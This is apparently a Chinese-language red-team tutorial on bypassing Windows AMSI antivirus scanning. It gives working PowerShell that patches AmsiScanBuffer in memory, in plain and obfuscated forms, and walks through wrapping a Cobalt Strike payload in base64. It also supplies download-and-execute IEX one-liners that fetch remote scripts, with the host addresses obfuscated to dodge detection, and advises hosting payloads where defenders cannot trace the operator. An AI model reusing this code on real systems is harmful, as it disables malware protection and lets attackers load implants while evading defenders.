# 反病毒接口AMSI的浅析和绕过

# 前言
## 如果觉得这篇文章能帮到你，请点击右上角的star支持一下，非常感谢！
## 视频教程：https://www.bilibili.com/video/BV13L411T75i/
# AMSI简介
### 许多内网场景或处于红队评估的渗透测试者很可能遇到过 AMSI 并且熟悉它的功能。AMSI 增强了对攻击期间常用的一些现代工具、策略和程序 (TTP) 的使用保护，因为它提高了反恶意软件产品的可见性。最相关的例子是 PowerShell 无文件加载，它已被一些APT组织和恶意软件制作商广泛研究。如今越来越多的防病毒厂商正在接入AMSI防病毒接口，因此在当下，如何去规避AMSI，成为红队渗透测试者不可避免的话题。

### 如前所述，AMSI 允许服务和应用程序与已安装的反恶意软件进行通信。当系统中开始创建进程或者被申请内存，AMSI 就会处于挂钩状态，例如，Windows 脚本主机(WSH) 和PowerShell，以便对正在执行的内容进行去混淆处理和分析。此内容在执行之前被“捕获”并发送到反恶意软件解决方案。 
## 打开PowerShell时amsi.dll自动加载
![image](https://user-images.githubusercontent.com/89376703/155829682-e02d955c-5446-4c6d-a853-ab37ad006ab6.png)


 
### 这是在 Windows 10 上实现 AMSI 的所有组件的列表：

### 用户帐户控制或 UAC（EXE、COM、MSI 或 ActiveX 安装的提升）、 PowerShell（脚本、交互式使用和动态代码评估）、Windows 脚本宿主（wscript.exe 和 cscript.exe）、JavaScript 和VBScript Office VBA 宏  
### (请注意，AMSI 不仅用于扫描脚本、代码、命令或 cmdlet，还可以用于扫描任何文件、内存或数据流，例如字符串、即时消息、图片或视频。)


# 0x01.字符串绕过AMSI
AMSI使用“基于字符串”的检测措施来确定PowerShell代码是否为恶意代码，如：
![image](https://user-images.githubusercontent.com/89376703/155834753-e99e8456-fc84-4911-af6d-b8821946b083.png)
## 这边简单介绍几种：
## 1.用Replace函数去替换字符串内容
![image](https://user-images.githubusercontent.com/89376703/155834805-44ed3e13-1e11-4cc9-94f5-bfbbfc2feef5.png)
## 2.字符串断点+拼接
![image](https://user-images.githubusercontent.com/89376703/155834827-6f9c03a3-0000-42df-816b-eaa23c876217.png)
## 3.手工操作
### 调试器附加并定位AmsiScanBuffer函数
![image](https://user-images.githubusercontent.com/89376703/155834861-fa5d38c9-04ed-4ad0-bbfa-a68cf9b52a13.png)
### 修补该函数使其直接返回(具体细节大家可以使用ida和x64dbg跟一下)。
![image](https://user-images.githubusercontent.com/89376703/155834888-cd93fefe-7143-4a21-91fb-2d4a9b6c7cb6.png)
### 绕过AMSI
![image](https://user-images.githubusercontent.com/89376703/155834898-a4671d3e-958e-46f4-ab1a-8e8c64d5e696.png)




# 0x02.通过修补 AMSI.dll 的操作码绕过ASMI

### 1.用cobaltstrike生成一个pyaload.ps1（）
![image](https://user-images.githubusercontent.com/89376703/155829428-4443b718-5d03-491f-84c7-87fbb089ddd0.png)

![image](https://user-images.githubusercontent.com/89376703/155735869-45a3c954-8737-4ac4-a4ad-3b750f335b82.png)



### 使用C#加密器对整个ps1文件进行base64加密（也可用base64加密解密网站：https://www.qqxiuzi.cn/bianma/base64.htm 注意：在加密之前删除无用的空行，避免出现解密时出现错误）
![image](https://user-images.githubusercontent.com/89376703/155734073-c1d9b0d1-0da9-40b2-ad38-bdc10a5563fb.png)



### 重新创建一个文件命名为pay.ps1,将上面的base64密文复制粘贴到下面代码的$decryption字符串变量中


![image](https://user-images.githubusercontent.com/89376703/155734157-19d0ed09-04fd-4ce2-90d4-6b27b0ef65cc.png)


### 这里就是一个常用的base64的解密公式，然后用IEX去执行解密后的密文

``` 
解密后的变量 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(加密后的变量)); 
```



### 但是amsi.dll对IEX是有严格限制的，直接执行解密密文必然会被拦截，因此这里我们需要一段破坏或者劫持amsi.dll的ps代码

```
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32
$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

### 当然如果你怕代码被云防护标记的话，可以添加一些混淆，比如说字符串的分裂和拼接，或者转换成ASCLL字符码

```
#导入API 函数
$ftkgk = @"
using System;
using System.Runtime.InteropServices;
public class ftkgk {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr gusdon, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $ftkgk
#通过 rasta-mouse 修补 amsi.dll AmsiScanBuffer
$lospbeo = [ftkgk]::LoadLibrary("$(('âms'+'í.d'+'ll').NOrMALiZe([cHAr](58+12)+[cHAR](111+96-96)+[cHAr](114+68-68)+[char](109+99-99)+[chAR]([bYte]0x44)) -replace [CHAr](92+22-22)+[CHaR](112)+[cHAr]([bYTE]0x7b)+[ChaR]([BYTe]0x4d)+[chAR]([byTE]0x6e)+[ChaR](125))")
$bhijoj = [ftkgk]::GetProcAddress($lospbeo, "$(('ÁmsìScànB'+'uffer').NOrmalizE([ChaR](70+60-60)+[chAR](111+76-76)+[chaR](114)+[char](109*69/69)+[CHAr]([ByTE]0x44)) -replace [ChaR](74+18)+[ChAR]([BYTE]0x70)+[cHAr](123)+[cHaR](77+31-31)+[CHar](110+64-64)+[Char](125+30-30))")
$p = 0
[ftkgk]::VirtualProtect($bhijoj, [uint32]5, 0x40, [ref]$p)
$jniv = "0xB8"
$kgmv = "0x57"
$odgn = "0x00"
$zalk = "0x07"
$cfun = "0x80"
$macm = "0xC3"
$hquzq = [Byte[]] ($jniv,$kgmv,$odgn,$zalk,+$cfun,+$macm)
[System.Runtime.InteropServices.Marshal]::Copy($hquzq, 0, $bhijoj, 6)
```
### 将混淆过后的代码插入解密代码中（pay.ps1）

![image](https://user-images.githubusercontent.com/89376703/155734244-a2185115-0d62-4b8c-96f0-7e09b6caf530.png)
### 放在windows defender环境下用PowerShell无文件执行即可

![image](https://user-images.githubusercontent.com/89376703/155734381-81a55fb3-78f8-4303-b78a-0e88702ff2fb.png)

### 可以看到可以绕过微软，能执行一些基本的命令，但是dumplass应该不行。

## **绕过原理**

### 绕过的关键是这段代码可以阻断amsi.dll中AmsiScanBuffer()这个函数的扫描进程，目前来说，这种方法可以百分之百绕过AMSI

### 2018 年 5 月，CyberArk 发布了 POC 代码，通过修补其功能之一，即 AmsiScanBuffer() 来绕过 AMSI

## AmsiScanBuffer 的API原型

```
HRESULT AmsiScanBuffer(
	HAMSICONTEXT amsiContext,
	PVOID buffer,   //缓冲区
	ULONG length,   //长度
	LPCWSTR contentName,
	HAMSISESSION amsiSession,
	AMSI_RESULT *result 
);
```

### 如您所见，此函数获取要扫描的所需缓冲区和缓冲区长度。其中一个参数“长度”本质上是绕过的关键。此参数包含要扫描的字符串的长度。如果通过某种方式将参数设置为常数值 0，则 AMSI 将被有效地绕过，我们需要做的就是在保存缓冲区长度的函数中修补寄存器。通过这样做，扫描将在零长度上执行。这是通过在运行时修补 AMSI.dll 的操作码来实现的。

# 绕过AMSI的代码基本流程为：
### 创建一个powershell进程
### 获取amsiscanbuffer函数地址
### 修改函数内存空间属性
### 修补函数执行体


## 使用GetProcAddress()函数获取 AmsiScanBuffer() 的句柄，找到amsi.dll中amsiscanbuffer()待修补的地址

![image](https://user-images.githubusercontent.com/89376703/155735632-e60d95eb-f017-45cf-bcc6-3ddb5218f2f6.png)


## 还有其他方法可以实现这一点。SecureYourIt 一篇博客文章（https://secureyourit.co.uk/wp/2019/05/10/dynamic-microsoft-office-365-amsi-in-memory-bypass-using-vba/)
## 显示了不同的定AmsiScanBuffer的方法。不过不是直接将句柄设置为AmsiScanBuffer()，而是首先将句柄设置为“AmsiUacInitialize()。从句柄中减去值 256 随后将导致句柄指向“AmsiScanBuffer()。

![image](https://user-images.githubusercontent.com/89376703/155735567-833e0c25-b118-429a-92d4-3502a008a485.png)

## 在上面的示例中，句柄设置为“AmsiUacInitialize()”，尽管你可以在技术上使用 Amsi.dll 中的任何函数。这种方法在针对“AmsiScanBuffer()”创建签名的情况下很有用。

# 0x03.分离免杀:抛弃 net webclient 远程加载方式（一）

## 首先我们需要对远程托管的Powershell样本进行免杀处理，然后在客户端用PowerShell脚本命令去读取远程托管的样本，并用IEX执行

## 这边用Stageless生成一个体积较大的powershell样本，因为样本是远程托管的，所以体积越大越好，这样混淆手法越丰富，发挥空间也越大就越难被检测出来（这边生成的体积大约是300-400Kb）
![image](https://user-images.githubusercontent.com/89376703/155830293-e173c15f-da7e-468e-8614-bb5deff12f35.png)

![image](https://user-images.githubusercontent.com/89376703/155830356-7b0bb5fb-7588-4520-802a-23d141a2f0f5.png)


## 对样本进行base64加密并放入字符串变量，写好解密公式,尽可能用Replace函数去替换变量中字符串以此规避AMSI的字符串特征扫描
![image](https://user-images.githubusercontent.com/89376703/155835164-46a06cde-a603-4448-9c40-ee217c2ebb79.png)

## 当然你还可以 加一些破坏amsi.dll的代码、进行异或加密解密或者是一些无用的混淆代码

# 远程加载代码：抛弃net webclient的方式
## 这里采用.net中的webrequest去请求远程恶意样本内容、读取样本、并执行样本。其实加载原理都是用IEX去执行远程的样本内容，大同小异，这边只是修改了一些特征，这里执行的前提是远程加载的powershell样本也得免杀，我们通常会将样本放置在网页可以访问的web服务器上，但是这同时也带来了风险，因为有些高级防病毒软件会标记一些恶意的公网IP（比如说卡巴斯基、小红伞），如果你将样本托管GitHub，虽然虽不会被防病毒标记，但是在实战攻防中非常容易就被蓝队溯源出个人信息，这边推荐一个可以在公网上挂起文本并且合法的网站https://paste.ee/  


```

$webreq = [System.Net.WebRequest]::Create(‘0.0.0.0/1.ps1’)
$resp=$webreq.GetResponse()
$respstream=$resp.GetResponseStream()
$reader=[System.IO.StreamReader]::new($respstream)
$content=$reader.ReadToEnd()
IEX($content)

```

## 我们可以用replace函数添加一些符号或者数字去混淆、替换暴露出来的IP地址
![image](https://user-images.githubusercontent.com/89376703/155734700-cc2a1aa8-9f42-4744-9e3f-842d0687347c.png)

## 当然有IEX的地方amsi.dll肯定会重点扫描，你必须在IEX执行之前就破坏它，因此这里可以在$content=$reader.ReadToEnd()和IEX($content)插入破坏amsi.dll的代码。
## 注意:(这里远程托管的PowerShell样本必须免杀AMSI，否则加载后一分钟左右会报毒)
![image](https://user-images.githubusercontent.com/89376703/155734863-2274eb70-a3ca-4000-bd89-bbce4eab3949.png)




# 0x04.远程加载方式（二）



```
IEX ((new-object net.webclient).downloadstring('http://0.0.0.0:8000/bypass.txt'.))
```

## 同样的我们可以通过Replace函数去替换字符串来混淆IP地址

```
IEX ((new-object net.webclient).downloadstring("http://10.@!#$%^&*()21@!#$%^&*()2.202.188@@@@@:8000/byp**************ass.tx**************t".Replace('@@@@@','').Replace('@!#$%^&*()','').Replace('**************',''))
```
![image](https://user-images.githubusercontent.com/89376703/155738711-0f72d9db-57de-4d25-aabb-405d9c2b4ee6.png)



# 0x05.远程加载方式（三）

```
IEX([Net.Webclient]::new().DownloadString("http://0.0.0.0:8000/bypass.txt".))
```

## 这个方法和方式二类似，本质上还是用WebClient去连接服务端的方式去读取web端的样本内容

## 混淆后的样本为

```
IEX([Net.Webclient]::new().DownloadString("h%%%t%%%tp:%%%//10.212.2@@@@@02.188@@@@@:80@@@@@00/bypas%%%s.tx%%%t".Replace('@@@@@','').Replace('%%%','')))
```

![image](https://user-images.githubusercontent.com/89376703/155734999-eda34e45-42c7-4e2b-a526-c4eae7cb183f.png)

# 绕过思路总结
## 1.破坏反病毒的扫描进程或者劫持amsi.dll都可以有效地去绕过AMSI，其次，amsi.dll可以用WinDbg等软件进行调试，可用于逆向工程、反汇编和动态分析。在调试中，WinDbg 将附加到运行 PowerShell 的进程，以分析 AMSI。
## 2.使用IEX和webclient远程加载powershell进程，虽然方式比较简单，但是进程容易被杀死，cs执行高危操作会马上掉线。当进程被挂钩的同时，想绕过更多的防病毒软件和EDR会变得困难。因此实战中红队人员通常会把PowerShell代码注入到合法的进程中，或者利用父进程欺骗去进一步完成高权限的提升
## 3.0x02的加载方式显然比较稳定，比起webclient，WebRequest相对特征不那么明显，因此每种加载方式都有优劣之处
## 4.当powershell进程中出现某个字符串被禁用时，多使用几个Replace函数去替换去混淆，在一定程度上可以做到动态绕过的效果

# 请不要将样本上传至公网沙箱，谢谢

# 微信联系

![092085746420d71c94b43382d755b60](https://user-images.githubusercontent.com/89376703/155832064-cd2f60f1-51a7-402c-b957-8c8ca1568095.jpg)


### 参考链接：
https://blog.f-secure.com/hunting-for-amsi-bypasses/

https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
